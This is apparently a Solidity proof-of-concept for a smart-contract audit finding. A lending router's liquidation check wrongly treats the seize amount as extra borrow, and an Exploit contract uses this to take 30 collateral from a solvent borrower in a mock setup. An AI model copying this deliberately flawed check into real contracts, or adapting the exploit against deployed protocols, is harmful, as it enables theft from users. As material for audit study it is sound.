// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  LEND — _checkLiquidationValid treats seize size as extra borrow
    (Sherlock 2025-05 contest, H-22, issue 930).
    A healthy account has 80 borrowed against 100 collateral. payload.amount
    is 30 collateral to seize, but it is passed as borrowAmount. 80+30 > 100,
    so the liquidation proceeds and the liquidator takes 30 from a solvent user. */

contract LToken {}

contract CollToken {
    string public symbol = "COLL";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LendStorage {
    struct User {
        uint256 borrow;
        uint256 collateral;
    }

    mapping(address => User) public users;

    function setUser(address account, uint256 borrow, uint256 collateral) external {
        users[account] = User(borrow, collateral);
    }

    function getHypotheticalAccountLiquidityCollateral(
        address account,
        LToken,
        uint256 redeemTokens,
        uint256 borrowAmount
    ) external view returns (uint256, uint256) {
        User memory u = users[account];
        return (u.borrow + borrowAmount, u.collateral - redeemTokens);
    }
}

struct LZPayload {
    address sender;
    address destlToken;
    uint256 amount;
}

contract CrossChainRouter {
    LendStorage public lendStorage;
    CollToken public coll;
    LToken public lToken;
    bool public wasHealthy;
    uint256 public seized;

    constructor(LendStorage _storage, CollToken _coll, LToken _lToken) {
        lendStorage = _storage;
        coll = _coll;
        lToken = _lToken;
    }

    function _checkLiquidationValid(LZPayload memory payload) internal view returns (bool) {
        // @> VULN: payload.amount is the seize size, but it is passed as borrowAmount
        (uint256 borrowed, uint256 collateral) = lendStorage.getHypotheticalAccountLiquidityCollateral(payload.sender, LToken(payable(payload.destlToken)), 0, payload.amount);
        return borrowed > collateral;
    }

    function executeLiquidation(LZPayload memory payload) external {
        (uint256 borrowed, uint256 collateral) = lendStorage.getHypotheticalAccountLiquidityCollateral(
            payload.sender, lToken, 0, 0
        );
        wasHealthy = borrowed <= collateral;
        require(_checkLiquidationValid(payload), "not liquidatable");
        seized = payload.amount;
        require(coll.transfer(msg.sender, payload.amount), "seize");
    }
}

contract Exploit {
    CollToken public coll; // nonce 1
    LendStorage public lendStorage; // nonce 2
    LToken public lToken; // nonce 3
    CrossChainRouter public router; // nonce 4
    address public borrower; // set in constructor, not a create

    constructor() {
        coll = new CollToken();
        lendStorage = new LendStorage();
        lToken = new LToken();
        router = new CrossChainRouter(lendStorage, coll, lToken);
        borrower = address(0xB0BB0B);
        lendStorage.setUser(borrower, 80 ether, 100 ether);
        coll.mint(address(router), 100 ether);
    }

    function run() external {
        LZPayload memory payload =
            LZPayload({sender: borrower, destlToken: address(lToken), amount: 30 ether});
        router.executeLiquidation(payload);
        require(router.wasHealthy(), "position was healthy");
        require(router.seized() == 30 ether, "seized 30");
        require(coll.balanceOf(address(this)) == 30 ether, "liquidator received 30");
        require(coll.balanceOf(address(router)) == 70 ether, "70 collateral left");
        (uint256 b, uint256 c) = lendStorage.users(borrower);
        require(b == 80 ether && c == 100 ether, "debt unchanged and still covered");
    }
}
